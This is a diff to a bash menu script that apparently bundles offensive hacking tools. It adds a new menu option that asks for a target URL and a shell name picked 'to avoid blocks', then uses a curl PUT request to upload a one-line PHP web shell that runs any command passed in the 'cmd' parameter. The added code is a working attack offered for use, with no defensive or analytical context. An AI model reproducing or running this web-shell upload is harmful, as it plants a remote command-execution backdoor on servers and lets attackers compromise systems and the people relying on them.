@@ -3187,6 +3187,19 @@ while true; do
 	"599")
 		Clona "utkusen/urlhunter"
 	;;
+	"600")
+		echo "Digit a remote URL or IP target with protocol"
+		read -p "(example, http://site.web or http://192.168.0.12): " URL
+		if [[ "$URL" != "" ]];
+		then
+			echo "Digit a cool shell name without extension to avoid blocks"
+			read -p "(example, wsh3ll): " SHL
+			if [[ "$SHL" != "" ]];
+			then
+				curl -v -X PUT -d '<?php system($_GET["cmd"]);?>' "$URL""/""$SHL"".php"
+			fi
+		fi
+	;;
 	*)
 		echo "error, invalid choice"
 	;;
